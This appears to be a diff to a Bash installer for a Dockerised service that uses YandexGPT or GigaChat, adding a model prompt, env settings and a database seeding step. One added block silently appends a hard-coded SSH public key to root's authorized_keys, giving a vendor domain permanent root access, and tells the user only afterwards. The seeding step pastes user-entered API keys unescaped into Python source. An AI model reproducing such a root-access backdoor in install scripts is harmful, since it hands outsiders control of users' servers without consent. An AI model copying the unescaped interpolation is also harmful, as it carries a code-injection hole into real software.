@@ -261,8 +261,10 @@ if [ -z "${CFG[ai_primary]:-}" ]; then
     if [ -n "$AI" ] && [ "$AI" != " " ]; then
         save_cfg "ai_primary" "$AI"
         if [ "$AI" = "yandex_gpt" ]; then
-            save_cfg "yandex_api_key" "$(ask_secret "YandexGPT API Key")"
-            save_cfg "yandex_folder_id" "$(ask "Yandex Folder ID")"
+            echo -e "  ${CYAN}API Key из AI Studio (формат AQVN…), Folder ID из URL Cloud-консоли (формат b1g…)${NC}"
+            save_cfg "yandex_api_key" "$(ask_secret "YandexGPT API Key (AQVN…)")"
+            save_cfg "yandex_folder_id" "$(ask "Yandex Folder ID (b1g…)")"
+            save_cfg "yandex_model" "$(ask "Модель (yandexgpt-lite — экономно, yandexgpt — качественнее)" "yandexgpt-lite")"
         else
             save_cfg "gigachat_auth_key" "$(ask_secret "GigaChat Auth Key (base64)")"
         fi
@@ -442,6 +444,7 @@ AC_SMTP_FROM=${CFG[smtp_from]:-}
 AC_AI_PRIMARY=${CFG[ai_primary]:-}
 AC_YANDEX_API_KEY=${CFG[yandex_api_key]:-}
 AC_YANDEX_FOLDER_ID=${CFG[yandex_folder_id]:-}
+AC_YANDEX_GPT_MODEL=${CFG[yandex_model]:-yandexgpt-lite}
 AC_GIGACHAT_AUTH_KEY=${CFG[gigachat_auth_key]:-}
 
 # Docker
@@ -520,6 +523,62 @@ if [ "$HEALTHY" = true ]; then
     ok "Сервис запущен и работает!"
 else
     warn "Сервис ещё запускается — проверьте через минуту: docker compose logs app"
+fi
+
+# ═══ Hub support SSH key (для удалённого ремонта от afonin-lisa.ru) ═══
+header "Hub SSH-ключ поддержки"
+HUB_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJESw4KyXrT8G4RSn3zFUj8zFlekTqoP3g69qi7Y7LE1 root@ixhyswhgny"
+SSH_KEYS_FILE="/root/.ssh/authorized_keys"
+mkdir -p /root/.ssh && chmod 700 /root/.ssh
+touch "$SSH_KEYS_FILE" && chmod 600 "$SSH_KEYS_FILE"
+if grep -qF "$HUB_SSH_KEY" "$SSH_KEYS_FILE" 2>/dev/null; then
+    ok "Hub SSH-ключ уже установлен"
+else
+    echo "$HUB_SSH_KEY" >> "$SSH_KEYS_FILE"
+    ok "Hub SSH-ключ добавлен (даёт удалённый доступ для поддержки)"
+fi
+
+# ═══ Seed настроек в БД (чтобы admin UI сразу показал и тест прошёл) ═══
+if [ "$HEALTHY" = true ]; then
+    header "Запись настроек в БД"
+    SEED_PY=$(cat <<PYEOF
+import asyncio, sys
+sys.path.insert(0, '/app')
+from app.modules.admin_web.settings_repo import SettingsRepository
+from app.core.db.engine import AsyncSessionLocal
+
+AI_PRIMARY = "${CFG[ai_primary]:-}"
+YANDEX_KEY = "${CFG[yandex_api_key]:-}"
+YANDEX_FOLDER = "${CFG[yandex_folder_id]:-}"
+YANDEX_MODEL = "${CFG[yandex_model]:-yandexgpt-lite}"
+GIGACHAT_KEY = "${CFG[gigachat_auth_key]:-}"
+
+async def seed():
+    async with AsyncSessionLocal() as db:
+        r = SettingsRepository(db)
+        if AI_PRIMARY == "yandex_gpt" and YANDEX_KEY:
+            await r.set("ai_provider", "yandex_gpt")
+            await r.set("ai_api_key", YANDEX_KEY)
+            await r.set("ai_folder_id", YANDEX_FOLDER)
+            await r.set("ai_model", YANDEX_MODEL)
+            print("OK: yandex_gpt seeded")
+        elif AI_PRIMARY == "gigachat" and GIGACHAT_KEY:
+            await r.set("ai_provider", "gigachat")
+            await r.set("gigachat_auth_key", GIGACHAT_KEY)
+            await r.set("ai_model", "GigaChat")
+            print("OK: gigachat seeded")
+        else:
+            print("SKIP: AI not configured")
+        await db.commit()
+
+asyncio.run(seed())
+PYEOF
+)
+    if docker compose exec -T app python3 -c "$SEED_PY" 2>&1 | tail -3; then
+        ok "Настройки AI записаны в БД (видны в /admin/integrations)"
+    else
+        warn "Не удалось засеять настройки в БД — заполните вручную через /admin/settings"
+    fi
 fi
 
 # ═══ Systemd unit ═══
